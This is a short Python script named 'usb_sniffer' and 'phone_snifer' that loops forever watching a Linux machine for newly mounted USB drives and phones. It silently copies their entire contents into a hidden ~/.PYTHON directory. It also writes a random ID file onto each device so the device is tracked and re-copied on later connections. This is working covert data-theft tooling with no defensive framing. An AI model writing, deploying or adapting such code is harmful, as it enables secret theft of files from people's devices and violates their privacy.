#Noor
import os
import threading
import random
from distutils import dir_util, errors
import subprocess
# check if any usb is plugged in

path_dst_dir = os.path.join(os.environ["HOME"], ".PYTHON")
dir_util.mkpath(path_dst_dir)


def copytree(src, storage=None):
    user_folder = random.sample("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!", 30)
    if storage is not None:
        with open(os.path.join(src, storage, "id_.txt"), "w") as file:
            file.write("".join(user_folder))
    else:
        with open(os.path.join(src, "id_.txt"), "w") as file:
            file.write("".join(user_folder))
    dir_util.copy_tree(src, os.path.join(path_dst_dir, "".join(user_folder)))


def usb_sniffer(usb):
    active.append(usb)
    path_to_usb = os.path.join(os.environ["HOME"].replace("home", "media"), usb)
    try:
        if "id_.txt" in os.listdir(path_to_usb):
            with open(os.path.join(path_to_usb, "id_.txt")) as file:
                user_folder = file.read().strip()
            if os.path.isdir(os.path.join(path_dst_dir, user_folder)):
                dir_util.copy_tree(path_to_usb, os.path.join(path_dst_dir, user_folder))
            else:
                copytree(path_to_usb)
        else:
            copytree(path_to_usb)
    except Exception as e:
        print(e)
    finally:
        active.remove(usb)


def phone_snifer(phone):
    try:
        active.append(phone)
        path_to_phone = os.path.join("/run/user/1000/gvfs", phone)
        sub_storages = os.listdir(path_to_phone)
        for storage in sub_storages:
            files = os.listdir(os.path.join(path_to_phone, storage))
            if "id_.txt" in files:
                with open(os.path.join(path_to_phone, storage, "id_.txt")) as file:
                    user_folder = file.read().strip()
                if os.path.isdir(os.path.join(path_dst_dir, user_folder)):
                    dir_util.copy_tree(path_to_phone, os.path.join(path_dst_dir, user_folder))
                else:
                    copytree(path_to_phone, storage)
                break
        else:
            if sub_storages:
                copytree(path_to_phone, random.choice(sub_storages))
    except Exception as e:
        print(e)
    finally:
        active.remove(phone)

# Active phone or usb being copied
active = ["HiSuite"]
while True:
    no_of_USBS = os.listdir(os.environ["HOME"].replace("home", "media"))
    if no_of_USBS:
        for usb in no_of_USBS:
            if usb not in active:
                t = threading.Thread(target=usb_sniffer, args=(usb,))
                t.start()

    no_of_phones = os.listdir("/run/user/1000/gvfs")
    if no_of_phones:
        for phone in no_of_phones:
            if phone not in active:
                t = threading.Thread(target=phone_snifer, args=(phone,))
                t.start()
